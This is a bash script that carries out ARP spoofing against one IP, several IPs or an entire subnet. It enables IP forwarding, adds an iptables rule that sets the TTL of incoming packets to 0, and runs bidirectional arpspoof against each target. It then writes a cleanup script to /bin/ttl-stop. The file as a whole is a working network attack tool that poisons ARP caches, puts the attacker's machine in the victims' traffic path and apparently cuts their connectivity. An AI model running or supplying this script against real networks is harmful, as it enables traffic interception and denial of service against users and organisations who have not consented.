#!/bin/bash

# Function to validate IP address
validate_ip() {
    local ip=$1
    local stat=1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -r i1 i2 i3 i4 <<< "$ip"
        if ((i1 <= 255 && i2 <= 255 && i3 <= 255 && i4 <= 255)); then
            stat=0
        fi
    fi
    return $stat
}

# Function to get network range using ipcalc and convert to individual IPs
get_ips_from_range() {
    local range=$1
    local device_ip=$2
    local gateway_ip=$3
    local ips=()

    # Use ipcalc to get the IP range
    ip_range=$(ipcalc "$range" | grep -E 'HostMin|HostMax' | awk '{print $2}')
    if [ -z "$ip_range" ]; then
        echo "Error: Invalid subnet or range."
        exit 1
    fi

    # Extract start and end IPs
    start_ip=$(echo "$ip_range" | head -n 1)
    end_ip=$(echo "$ip_range" | tail -n 1)

    # Convert IPs to numbers for iteration
    IFS='.' read -r s1 s2 s3 s4 <<< "$start_ip"
    IFS='.' read -r e1 e2 e3 e4 <<< "$end_ip"
    start_num=$(( (s1 << 24) + (s2 << 16) + (s3 << 8) + s4 ))
    end_num=$(( (e1 << 24) + (e2 << 16) + (e3 << 8) + e4 ))

    # Generate individual IPs, excluding device and gateway IPs
    for ((i=start_num; i<=end_num; i++)); do
        ip=$(( (i >> 24) & 255 )).$(( (i >> 16) & 255 )).$(( (i >> 8) & 255 )).$(( i & 255 ))
        if [ "$ip" != "$device_ip" ] && [ "$ip" != "$gateway_ip" ]; then
            ips+=("$ip")
        fi
    done
    echo "${ips[@]}"
}

# Prompt for network interface
read -p "Enter Network Interface (e.g. wlan0): " INTERFACE
if [ -z "$INTERFACE" ]; then
    echo "Error: Interface cannot be empty."
    exit 1
fi

# Prompt for device IP
read -p "Enter the Device IP: " DEVICE_IP
if ! validate_ip "$DEVICE_IP"; then
    echo "Error: Invalid device IP address."
    exit 1
fi

# Prompt for gateway IP
read -p "Enter the Gateway IP: " GATEWAY_IP
if ! validate_ip "$GATEWAY_IP"; then
    echo "Error: Invalid gateway IP address."
    exit 1
fi

# Prompt for target IP(s) or subnet
read -p "Enter Target; Single IP, Multiple IPs separated by space, or Subnet e.g. 10.0.0.1/20: " TARGET_INPUT

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set TTL to 0 for incoming packets
iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0

# Process target IPs
if [[ "$TARGET_INPUT" =~ / ]]; then
    # Handle subnet input
    TARGET_IPS=($(get_ips_from_range "$TARGET_INPUT" "$DEVICE_IP" "$GATEWAY_IP"))
else
    # Handle single or multiple IPs
    IFS=' ' read -r -a TARGET_IPS <<< "$TARGET_INPUT"
fi

# Validate and perform ARP spoofing for each target IP
for TARGET_IP in "${TARGET_IPS[@]}"; do
    if validate_ip "$TARGET_IP"; then
        if [ "$TARGET_IP" != "$DEVICE_IP" ] && [ "$TARGET_IP" != "$GATEWAY_IP" ]; then
            echo "Starting ARP spoofing for target: $TARGET_IP"
            arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY_IP" &
            arpspoof -i "$INTERFACE" -t "$GATEWAY_IP" "$TARGET_IP" &
        else
            echo "Skipping $TARGET_IP (matches device or gateway IP)"
        fi
    else
        echo "Invalid IP: $TARGET_IP, skipping..."
    fi
done

# Trap to clean up on exit
cat > /bin/ttl-stop << EOF
#!/bin/sh

pkill -f arpspoof
iptables -t mangle -F
EOF
chmod 755 /bin/ttl-stop
